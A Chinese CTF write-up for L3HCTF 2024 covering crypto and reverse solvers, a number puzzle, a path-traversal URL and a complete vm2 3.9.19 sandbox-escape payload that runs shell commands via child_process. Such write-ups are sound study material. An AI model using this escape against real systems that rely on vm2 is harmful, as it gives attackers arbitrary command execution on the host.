---
title: UKFC2024 L3HCTF WP
contest: L3HCTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [cryptoapi-des-decrypt, modified-tea-delta, brotli-xor, longest-common-subsequence, vm2-sandbox-escape, custom-inspect, calc-fibonacci-gauss]
attack_chain:
- Windows CryptoAPI: CryptAcquireContextA + CryptCreateHash + CryptHashData
- CryptDeriveKey (AES-256) + CryptDecrypt 还原 v78 32 字节密文
- 魔改 TEA: delta=0x114514, sum=delta*rounds, v1 -= ((v0<<4^v0>>5)+v0) ^ (sum+key[(sum>>11)&3])
- brotli 解压 dump.br + XOR secret 6 字符密钥
- 最长公共子序列 DP 求解 num2/num3 字符串集
- num1 = 2023 + (num1 & 15) - (num1 & 240)
- num2 = func2(num2+7) 斐波那契
- num3 种子 random.seed(num3) + gauss(num2, 0.2)
- flag: L3HCTF{202817711117711x25763695063}
- /test/?redirect=AB6mJQxU 路径穿越拿 flag
- vm2@3.9.19 Sandbox Escape via custom inspect
- WebAssembly.compileStreaming(obj) + Symbol.for('nodejs.util.inspect.custom')
- valueOf: undefined, constructor: undefined 绕过 vm2 沙箱
- inspect.constructor('return process')().mainModule.require('child_process').execSync('rm error.txt;ln -s /flag error.txt')
key_payload: Symbol.for('nodejs.util.inspect.custom')  # vm2 沙箱逃逸
one_liner: L3HCTF 2024：Windows CryptoAPI + 魔改 TEA + brotli XOR + LCS DP + vm2 sandbox 逃逸 + Fibonacci/gauss 伪随机。
lesson: vm2 沙箱可被 Symbol.for('nodejs.util.inspect.custom') 配合 WebAssembly.compileStreaming 逃逸。
quality: high
---
# UKFC2024 L3HCTF WP

## 1. Reverse: Windows CryptoAPI AES
```c
#include <windows.h>
#include <wincrypt.h>
HCRYPTPROV hProv = 0;
HCRYPTHASH hHash = 0;
HCRYPTKEY hKey = 0;
BYTE v70[16] = { 0xEA, 0x3E, 0xD4, 0x1C, 0x70, 0xCB, 0xD7, 0x47, 0x98, 0x5E, 0xCA, 0xDB, 0x53, 0x0C, 0x39, 0x2B };
BYTE v78[32] = {0x0B, 0xAF, 0x51, 0x21, 0x9C, 0x52, 0x10, 0x89, 0x3F, 0x2C, 0x34, 0x30, ...};
DWORD v73 = 32;

if (CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) 
    && CryptCreateHash(hProv, 32771, 0, 0, &hHash) 
    && CryptHashData(hHash, v70, 16, 0) 
    && CryptDeriveKey(hProv, 26126, hHash, CRYPT_EXPORTABLE, &hKey)) {
    CryptDecrypt(hKey, 0, 0, 0, v78, &v73);
}
```

## 2. Reverse: 魔改 TEA
```c
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    uint32_t v0 = v[0], v1 = v[1], delta = 0x114514, sum = delta * num_rounds;
    for (i = 0; i < num_rounds; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]);
    }
}
```

## 3. Misc: brotli + XOR
```python
import brotli
decompressed = brotli.decompress(open("dump.br", "rb").read())
s = "secret"
enc = b'JFYvMVU5QDoNQjomJlBULSQaCihTAFY='
m = base64.b64decode(enc)
for i in range(len(m)):
    print(chr(m[i] ^ ord(s[i%6])), end="")
```

## 4. Reverse: LCS DP
```python
def func1(arr, lss, i, j):
    # 字符串逐位比较 LCS (差 1 字符 + 一次失配)
    if l1 - l2 == 1:
        while n < l2:
            if s1[n] != s2[n]:
                if flag: flag = False
                else: return 0
            n += 1
        return 1

def solution(lss):
    abcarray = [-1] * len(lss)
    arr = [-1] * (len(lss) * len(lss))
    return max(abc(abcarray, arr, lss, i) for i in range(len(lss)))
```

## 5. Misc: 数字谜题
```python
def func2(n):  # Fibonacci
    a, b = 1, 1
    for i in range(n - 1): a, b = b, a + b
    return a

def calc(nums):
    num1 = 2023 + (nums[0] & 15) - (nums[0] & 240)
    num2 = func2(nums[1] + 7)
    random.seed(nums[2])
    flag = f"{num1}{num2}{nums[2]}{random.gauss(num2, 0.2)}"
    return 'L3HCTF{' + flag.replace('.', 'x') + '}'

for i in range(2, 17): calc([i, 15, 1])
# L3HCTF{202817711117711x25763695063}
```

## 6. Web: 路径穿越 + 命令注入
```bash
访问 http://1.95.4.251:57080/test/?redirect=AB6mJQxU
# 通过 redirect 参数读 flag
```

## 7. Web: vm2 3.9.19 Sandbox Escape
```javascript
// https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
        inspect.constructor('return process')().mainModule.require('child_process').execSync('rm /app/error.txt;ln -s /flag /app/error.txt').toString();
    },
    valueOf: undefined,
    constructor: undefined,
}
WebAssembly.compileStreaming(obj).catch(()=>{});
```
- 绕过 vm2 沙箱
- 关键：`Symbol.for('nodejs.util.inspect.custom')` + WebAssembly.compileStreaming
- `valueOf: undefined, constructor: undefined` 防止 vm2 包装
